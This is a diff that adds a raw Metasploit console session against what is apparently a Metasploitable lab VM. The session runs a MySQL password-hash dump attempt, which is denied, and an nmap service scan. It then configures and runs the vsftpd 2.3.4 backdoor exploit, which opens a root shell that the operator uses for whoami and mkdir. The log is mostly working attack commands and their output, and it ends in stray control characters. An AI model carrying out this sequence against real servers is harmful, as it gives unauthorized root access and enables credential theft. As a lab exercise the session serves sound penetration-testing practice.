@@ -1,0 +1,238 @@
+msf6 > info auxiliary/scanner/mysql/mysql_hashdump
+
+       Name: MYSQL Password Hashdump
+     Module: auxiliary/scanner/mysql/mysql_hashdump
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  theLightCosine <theLightCosine@metasploit.com>
+
+Check supported:
+  No
+
+Basic options:
+  Name      Current Setting  Required  Description
+  ----      ---------------  --------  -----------
+  PASSWORD                   no        The password for the specified username
+  RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+  RPORT     3306             yes       The target port (TCP)
+  THREADS   1                yes       The number of concurrent threads (max one per host)
+  USERNAME                   no        The username to authenticate as
+
+Description:
+  This module extracts the usernames and encrypted password hashes 
+  from a MySQL server and stores them for later cracking.
+
+msf6 > use auxiliary/scanner/mysql/mysql_hashdump
+msf6 auxiliary(scanner/mysql/mysql_hashdump) > show options
+
+Module options (auxiliary/scanner/mysql/mysql_hashdump):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        The password for the specified username
+   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT     3306             yes       The target port (TCP)
+   THREADS   1                yes       The number of concurrent threads (max one per host)
+   USERNAME                   no        The username to authenticate as
+
+msf6 auxiliary(scanner/mysql/mysql_hashdump) > set rhosts 10.9.211.41
+rhosts => 10.9.211.41
+msf6 auxiliary(scanner/mysql/mysql_hashdump) > set threads 6
+threads => 6
+msf6 auxiliary(scanner/mysql/mysql_hashdump) > show options
+
+Module options (auxiliary/scanner/mysql/mysql_hashdump):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        The password for the specified username
+   RHOSTS    10.9.211.41      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT     3306             yes       The target port (TCP)
+   THREADS   6                yes       The number of concurrent threads (max one per host)
+   USERNAME                   no        The username to authenticate as
+
+msf6 auxiliary(scanner/mysql/mysql_hashdump) > exploit
+
+[-] 10.9.211.41:3306      - Access denied
+[*] 10.9.211.41:3306      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/mysql/mysql_hashdump) > back
+msf6 > whois 10.9.211.41
+[*] exec: whois 10.9.211.41
+
+connect: Network is unreachable
+msf6 > whois 10.9.211.41
+[*] exec: whois 10.9.211.41
+
+connect: Network is unreachable
+msf6 > whois 127.0.0.1
+[*] exec: whois 127.0.0.1
+
+connect: Network is unreachable
+msf6 > nmap -F -sV 10.9.211.41
+[*] exec: nmap -F -sV 10.9.211.41
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-03 08:26 IST
+Nmap scan report for 10.9.211.41
+Host is up (0.0028s latency).
+Not shown: 82 filtered tcp ports (no-response)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+513/tcp  open  login?
+514/tcp  open  tcpwrapped
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.24 seconds
+msf6 > search vsftpd 2.3.4
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
+
+msf6 > search vsftpd 2.3.4
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
+
+msf6 > search vsftpd2.3.4
+[-] No results from search
+msf6 > info exploit/unix/ftp/vsftpd_234_backdoor
+
+       Name: VSFTPD v2.3.4 Backdoor Command Execution
+     Module: exploit/unix/ftp/vsftpd_234_backdoor
+   Platform: Unix
+       Arch: cmd
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2011-07-03
+
+Provided by:
+  hdm <x@hdm.io>
+  MC <mc@metasploit.com>
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Automatic
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+  RPORT   21               yes       The target port (TCP)
+
+Payload information:
+  Space: 2000
+  Avoid: 0 characters
+
+Description:
+  This module exploits a malicious backdoor that was added to the 
+  VSFTPD download archive. This backdoor was introduced into the 
+  vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 
+  according to the most recent information available. This backdoor 
+  was removed on July 3rd 2011.
+
+References:
+  OSVDB (73573)
+  http://pastebin.com/AetT9sS5
+  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+[*] No payload configured, defaulting to cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT   21               yes       The target port (TCP)
+
+
+Payload options (cmd/unix/interact):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.9.211.41
+rhosts => 10.9.211.41
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.9.211.41      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT   21               yes       The target port (TCP)
+
+
+Payload options (cmd/unix/interact):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
+
+[*] 10.9.211.41:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.9.211.41:21 - USER: 331 Please specify the password.
+[+] 10.9.211.41:21 - Backdoor service has been spawned, handling...
+[+] 10.9.211.41:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (10.0.2.15:46263 -> 10.9.211.41:6200) at 2022-05-03 08:36:49 +0530
+
+whoami
+root
+cd /home
+mkdir test
+^X@sS^A^A
